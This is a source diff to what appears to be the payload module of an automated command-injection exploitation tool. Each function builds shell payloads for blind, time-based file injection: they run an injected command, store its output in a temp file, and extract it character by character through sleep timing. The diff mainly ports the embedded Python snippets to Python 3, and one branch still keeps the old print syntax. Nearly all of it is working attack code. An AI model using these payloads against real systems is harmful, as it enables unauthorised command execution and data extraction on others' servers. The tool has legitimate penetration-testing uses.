@@ -111,7 +111,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
@@ -136,24 +136,24 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
   else:  
     if separator == ";" :
       payload = (separator +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
-                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
+                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\")" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
     elif separator == "%0a" :
       #separator = "\n"
       payload = (separator +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
-                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
+                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\")" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -161,12 +161,12 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
-                "$(python -c \"import time\ntime.sleep(0)\") " + separator +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
-                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator +
+                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
-                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
@@ -174,10 +174,10 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + " "
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + " "
                 # Find the length of the output, using readline().
-                "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                "[ " + str(j) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 ) 
     else:
       pass
@@ -188,7 +188,9 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
-      
+    else:
+      if settings.TARGET_OS != "win":
+        payload = payload.replace("\n","%0d")      
   return payload
 
 """
@@ -243,7 +245,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${%23str}" + separator +
-                "if [ " + str(j) + " != ${str1} ]" + separator +
+                "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then sleep 0 " + separator +
                 "else sleep " + str(timesec) + separator +
                 # Transform to ASCII
@@ -261,7 +263,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${%23str}" + separator +
-                "if [ " + str(j) + " != ${str1} ]" + separator +
+                "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then sleep 0 " + separator +
                 "else sleep " + str(timesec) + separator +
                 # Transform to ASCII
@@ -308,7 +310,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -339,24 +341,24 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
   else: 
     if separator == ";" :
       payload = (separator +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
-                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
-                "if [ " + str(j) + " != ${str1} ] " + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\")" + separator +
+                "if [ " + str(j) + " -ne ${str1} ] " + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
     elif separator == "%0a" :
       #separator = "\n"
       payload = (separator +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
-                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
-                "if [ " + str(j) + " != ${str1} ] " + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\")" + separator +
+                "if [ " + str(j) + " -ne ${str1} ] " + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )    
 
@@ -364,12 +366,12 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
-                "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" +  separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" +  separator +
                 # Find the length of the output, using readline().
-                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator +
+                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator +
                 "[ " + str(j) + " -eq ${str1} ] " +  separator +
-                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator) 
@@ -377,9 +379,9 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
     elif separator == "||" :     
       pipe = "|"
       payload = (pipe +
-                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + " "
-                "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + " "
+                "[ " + str(j) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )                   
     else:
       pass
@@ -390,7 +392,9 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
-
+    else:
+      if settings.TARGET_OS != "win":
+        payload = payload.replace("\n","%0d")
   return payload
 
 """
@@ -422,7 +426,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (separator +
                 # Use space as delimiter
                 "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
-                "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
+                "if [ " +  str(ascii_char) + " -ne ${str} ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
                 "fi "
@@ -433,7 +437,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (separator +
                 # Use space as delimiter
                 "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
-                "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
+                "if [ " +  str(ascii_char) + " -ne ${str} ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
                 "fi "
@@ -473,7 +477,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
@@ -496,20 +500,20 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
   else: 
     if separator == ";" :
       payload = (separator +
-                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
-                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" +str(num_of_chars-1)+ "]))\nexit(0)\")" + separator +
+                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
     elif separator == "%0a" :
       #separator = "\n"
       payload = (separator +
-                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
-                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" +str(num_of_chars-1)+ "]))\nexit(0)\")" + separator +
+                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 ) 
 
@@ -517,10 +521,10 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
-                "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
-                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") " +  separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
+                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" +str(num_of_chars-1)+ "]))\nexit(0)\")" +  separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
@@ -528,8 +532,8 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne  $(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                "[ " + str(ascii_char) + " -ne  $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" +str(num_of_chars-1)+ "]))\nexit(0)\") ] " + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
     else:
       pass
@@ -539,7 +543,9 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
-
+    else:
+      if settings.TARGET_OS != "win":
+        payload = payload.replace("\n","%0d")
   return payload
 
 """
@@ -572,7 +578,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
     if separator == ";" :
       payload = (separator +
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
-                "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator +
+                "if [ " + str(ord(str(ascii_char))) + " -ne ${str} ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
                 "fi "
@@ -582,7 +588,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       #separator = "\n"
       payload = (separator +
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
-                "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator +
+                "if [ " + str(ord(str(ascii_char))) + " -ne ${str} ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
                 "fi "
@@ -616,7 +622,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
@@ -639,20 +645,20 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
   else: 
     if separator == ";" :
       payload = (separator +
-                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator +
-                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
+                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
     elif separator == "%0a" :
       #separator = "\n"
       payload = (separator +
-                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator +
-                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
+                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
+                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
+                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -660,10 +666,10 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
-                "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
-                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") " +  separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
+                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") " +  separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
@@ -671,8 +677,8 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne  $(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                "[ " + str(ascii_char) + " -ne  $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") ] " + separator +
+                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
     else:
       pass
@@ -683,7 +689,9 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
-
+    else:
+      if settings.TARGET_OS != "win":
+        payload = payload.replace("\n","%0d")
   return payload
   
 # eof
